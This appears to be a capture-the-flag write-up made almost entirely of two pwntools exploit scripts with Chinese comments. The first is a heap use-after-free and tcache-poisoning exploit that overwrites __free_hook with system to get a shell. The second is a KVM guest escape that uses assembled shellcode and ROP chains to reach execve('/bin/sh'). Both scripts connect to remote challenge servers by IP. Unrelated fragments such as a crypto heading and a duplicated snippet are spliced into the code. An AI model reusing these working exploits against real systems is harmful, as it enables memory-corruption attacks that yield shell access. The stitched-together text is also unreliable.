Remove(2, 0)
# leak heap addr
Show(2, 0)
sh.recvuntil('its name: ')
sh.recv(8)
heap_addr = u64(sh.recv(8)) - 0x10
Log("heap_addr")
#! /usr/bin/python2
# coding=utf-8
import sys
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
def Log(name):
    log.success(name+' = '+hex(eval(name)))
libc = ELF('./libc.so.6')
if(len(sys.argv)==1):     #local
    cmd = ["./pwn"]
    sh = process(cmd)
else:           #remtoe
    sh = remote("121.36.241.104", 9999)
    sh.recvuntil('`')
    cmd = sh.recvuntil('`', drop=True)
    print(cmd)
    stamp = os.popen(cmd).read()
    print(stamp)
    sh.send(stamp)
def Num(n):
    sh.sendline(str(n))
def Cmd(n):
    sh.recvuntil("Your choice > ")
    Num(n)
def Insert(x, y, cont):
    Cmd(0)
    sh.recvuntil(": ")
    Num(x)
    sh.recvuntil(": ")
    Num(y)
    sh.recvuntil(": ")
    sh.send(cont)
def Remove(x, y):
    Cmd(1)
    sh.recvuntil(": ")
    Num(x)
    sh.recvuntil(": ")
    Num(y)
def Edit(x, y, cont):
    Cmd(2)
    sh.recvuntil(": ")
    Num(x)
    sh.recvuntil(": ")
    Num(y)
    sh.recvuntil(": ")
    sh.send(cont)
def Show(x, y):
    Cmd(3)
    sh.recvuntil(": ")
    Num(x)
    sh.recvuntil(": ")
    Num(y)
def Query(ld_x, ld_y, ru_x, ru_y):
    Cmd(4)
    sh.recvuntil(": ")
    Num(ld_x)
    sh.recvuntil(": ")
    Num(ld_y)
    sh.recvuntil(": ")
    Num(ru_x)
    sh.recvuntil(": ")
    Num(ru_y)
def GDB():
    gdb.attach(sh, '''
    print *(long long *)(0x0000555555554000+0x205310)
    print *(long long *)($1+0x10) 
    telescope $2 8
    break *(0x0000555555554000+0x344E)
    ''')
# [0, 1] [2, 3, 4, 5]
exp = p64(0)
exp+= p64(0x4b1)    # chunk's size
exp = exp.ljust(0x20, '\\x00')
Insert(0, 0, exp)   # UB chunk head
Insert(1, 0, '1'*0x20)
Insert(2, 0, '2'*0x20)
Insert(3, 0, '3'*0x20)
Insert(4, 0, '4'*0x20)
Insert(5, 0, '5'*0x20)
# heap spray
for i in range(0x11):
    Insert(0, 0, p8(i)*0x20)
# [0, 1] [3, 4], tcache[0x30]->ele_2->ele_5
Remove(5, 0)
Remove(2, 0)
# double link: [0, 1, 2] [2, 3, 4], tcache[0x30]->ele_5
Insert(2, 0, '2'*0x20)
# UAF: [0, 1] [2, 3, 4], tcache[0x30]->ele_2->ele_5
Remove(2, 0)
# leak heap addr
Show(2, 0)
sh.recvuntil('its name: ')
sh.recv(8)
heap_addr = u64(sh.recv(8)) - 0x10
Log("heap_addr")
# control tcache: Tcache[0x30]->ele_2->UB_chunk
exp = p64(heap_addr+0x2d0+0x10)
exp = exp.ljust(0x20, '\\x00')
Edit(2, 0, exp)
# allocate to UB_chunk: [0, 1] [2, 3, 4, 6]
Insert(2, 0, '2'*0x20)
exp = flat(0, 0, 0, 0x31)
Insert(6, 0, exp)
# free UB_chunk and get libc addr: [0, 1] [2, 3, 4]
Remove(6, 0)
Show(0, 0)
sh.recvuntil('its name: ')
sh.recv(0x10)
libc.address = u64(sh.recv(8))-0x3ebca0
Log("libc.address")
# trigger double link again: [0, 1, 2] [2, 3, 4] 
Remove(2, 0)
Insert(2, 0, '2'*0x20)
# UAF: [0, 1] [2, 3, 4] Tcache[0x30]->ele_2
Remove(2, 0)
# Tcache[0x30]->ele_2->__free_hook
exp = flat(libc.symbols['__free_hook'], 0, 0, 0)
Edit(2, 0, exp)
# allocate to __free_hook
exp = flat(libc.symbols['system'], 0, 0, 0)
Insert(0, 0, exp)
Insert(0, 0, exp)
# getshell
Edit(0, 0, "/bin/sh".ljust(0x20, '\\x00'))
Remove(0, 0)
#GDB()
sh.interactive()
MyKvm
和这个很像
https://github.com/kscieslinski/CTF/tree/master/pwn/conf2020/kvm
参考这个还原下伪代码
https://github.com/kscieslinski/CTF/blob/master/pwn/conf2020/kvm/kvm_source.c
from pwn import *
import fuckpy3
import struct, sys, os
context.log_level = 'debug'
context.arch = 'amd64'
# p = process('./lib/ld-2.23.so ./mykvm'.split(' '),env=
{'LD_LIBRARY_PATH':'./lib'})#,"LD_PRELOAD":"./lib/ld-2.23.so ./lib/libc.so.6 
./lib/libreadline.so.6.3 ./lib/libtinfo.so.5.9"}) 
p = remote('20.247.110.192',10888)
# p = remote('0',8888)
def launch_gdb():
    input()
def nasm(code):
  open("/tmp/shellcode.asm", 'w').write(code)
  ret = os.system("nasm -f bin -o /tmp/shellcode.bin /tmp/shellcode.asm")
  code = b''
  if ret == 0:
    code = open("/tmp/shellcode.bin", 'rb').read()
  os.unlink("/tmp/shellcode.asm")
  os.unlink("/tmp/shellcode.bin")
  return code
def format_rop(payload):
    res = ''
    for i in range(0,len(payload),4):
        res += f'dd {hex(u32(payload[i:i+4]))}\n'
    return res
payload = p64(0x4011B3) + p64(0x602088) 
payload += p64(0x4009C6)
payload += p64(0x4011AA)
payload += p64(0x0) + p64(1) + p64(0x602060) + p64(0x100) + p64(0x602100) + p64(0)
payload += p64(0x401190)
payload += p64(0) * 2 + p64(0x602100) + p64(0) * 4 + p64(0x401145)
shellcode = '''
BITS 16
ORG 0h
GDT_FLAGS_32_BIT_SIZE      equ 01b
GDT_FLAGS_16_BIT_SIZE      equ 00b
GDT_FLAGS_BYTE_GRANULARITY equ 00b
GDT_FLAGS_PAGE_GRANULARITY equ 10b
GDT_ACCESS_ACCESSED         equ 00000001b
GDT_ACCESS_NOT_ACCESSED     equ 00000000b
GDT_ACCESS_RW               equ 00000010b
GDT_ACCESS_GROW_DOWN        equ 00000100b
GDT_ACCESS_EXECUTABLE       equ 00001000b
GDT_ACCESS_DEFAULT_BIT      equ 00010000b
GDT_ACCESS_RING_LEVEL_0     equ 00000000b
GDT_ACCESS_RING_LEVEL_1     equ 00100000b
GDT_ACCESS_RING_LEVEL_2     equ 01000000b
GDT_ACCESS_RING_LEVEL_3   equ 01100000b
GDT_ACCESS_PRESENT      equ 10000000b
GDT_CODE_ACCESS_BYTE       equ GDT_ACCESS_DEFAULT_BIT | GDT_ACCESS_PRESENT | 
GDT_ACCESS_RING_LEVEL_0 | GDT_ACCESS_EXECUTABLE | GDT_ACCESS_RW 
GDT_DATA_ACCESS_BYTE       equ GDT_ACCESS_DEFAULT_BIT | GDT_ACCESS_PRESENT | 
GDT_ACCESS_RING_LEVEL_0 | GDT_ACCESS_RW
GDT_CODE_FLAGS                  equ GDT_FLAGS_32_BIT_SIZE  | GDT_FLAGS_PAGE_GRANULARITY
GDT_DATA_FLAGS                  equ GDT_FLAGS_32_BIT_SIZE  | GDT_FLAGS_PAGE_GRANULARITY
GDT_BASE equ 0x4000
jmp start
nop
nop
nop
nop
nop
{0}
start:
xor ax, ax
mov ds, ax
; enable serial
mov al, 0x41
mov dx, 0x3f8
out dx, al 
; setup gdt
mov bx, GDT_BASE + 8
mov word [bx], 0xffff
;mov word [bx+2], 0
;mov byte [bx+4], 0
mov byte [bx+5], GDT_CODE_ACCESS_BYTE
mov byte [bx+6], (GDT_CODE_FLAGS << 6) | 0xF
;mov byte [bx+7], 0
add bx, 8
mov word [bx], 0xffff
;mov word [bx+2], 0
;mov byte [bx+4], 0
mov byte [bx+5], GDT_DATA_ACCESS_BYTE
mov byte [bx+6], (GDT_DATA_FLAGS << 6) | 0xF
;mov byte [bx+7], 0
cli
xor ax, ax
mov ds, ax
lgdt [gdt_descriptor]
mov eax, cr0
or eax, 0x1
mov cr0, eax
jmp 08:protected_mode
BITS 32
protected_mode:
mov ax, 0x10
mov ds, ax
mov es, ax
mov fs, ax
mov ecx,[0x7100]
;add ecx,70432
xor eax, eax
sub ecx,0x603000
loop:
add ecx,4
add eax,4
cmp eax,100000
jz end
cmp dword [ecx],0x61616161
jnz loop
mov dword [ecx],0xdeadbeef
mov dword [ecx + 4],0xdeadbeef
mov dword [ecx + 8],0x4011AC ;0x4011AC
mov dword [ecx + 12],0
jmp loop
end:
mov dword [0x7100],0x602020
mov dword [0x7104],0
Crypto
RSA LEAK
论⽂：8.pdf (upm.edu.my)
hlt
ALIGN 16
gdt_descriptor:
  dw 2048
    dd GDT_BASE 
'''.format(format_rop(payload))
payload = nasm(shellcode)
p.sendlineafter(b'your code size: ',f'{len(payload)}')
p.sendafter(b'your code: ',payload)
input()
p.sendlineafter(b'guest name: ','a' * 7)
p.sendlineafter(b'guest passwd: ','a' * 7)
p.sendlineafter(b'host name: ','a' * 7)
p.recvline()
sleep(5)
leak = u64(p.recv(6) + b'\x00\x00') - 1012016
log.info('leak addr ' + hex(leak))
sys_addr = 283552 + leak
binsh = 0x18CE57 + leak
rebase_0 = lambda x : p64(x + leak)
rop2 = p64(0x4011B4) * 2 + p64(0x4011B3) + p64(binsh) 
rop2 += rebase_0(0x00000000000202f8) # 0x00000000000202f8: pop rsi; ret;
rop2 += p64(0)
rop2 += rebase_0(0x0000000000001b92) # 0x0000000000001b92: pop rdx; ret;
rop2 += p64(0)
rop2 += rebase_0(0x000000000003a738) # 0x000000000003a738: pop rax; ret;
rop2 += p64(0x000000000000003b)
rop2 += rebase_0(0x00000000000bc3f5) # 0x00000000000bc3f5: syscall; ret;
p.send(rop2)
p.interactive()
# from pwn import *
import requests